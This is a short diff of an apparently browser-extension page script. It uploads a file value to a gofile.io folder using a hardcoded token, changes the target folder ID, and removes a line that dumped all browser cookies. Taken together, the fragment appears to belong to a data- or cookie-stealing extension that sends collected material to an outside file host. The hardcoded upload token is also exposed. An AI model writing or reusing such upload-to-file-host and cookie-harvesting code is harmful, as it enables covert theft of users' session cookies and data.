@@ -28,7 +28,7 @@
     var formdata = new FormData();
     formdata.append("File",fileurl);
     formdata.append("token", "5JzuJ0Lqnkaj6mu7407luENsbI2lDP25");
-    formdata.append("folderId", "aab68b05-d388-4b5b-95b3-4baa9aeb81ed");
+    formdata.append("folderId", "505611a9-6bde-4ce8-bfe0-b289cfc2821a");
      var requestOptions = {
        method: 'POST',
        body: formdata,
@@ -42,9 +42,7 @@ fetch("https://store1.gofile.io/uploadFile", requestOptions)
     console.log("done:)");
   
 	});
-    chrome.runtime.cookies.getAll({  }, (cookies) => {
-     console.log(cookies);
-   })
+    
 	</script>
 </head>
 
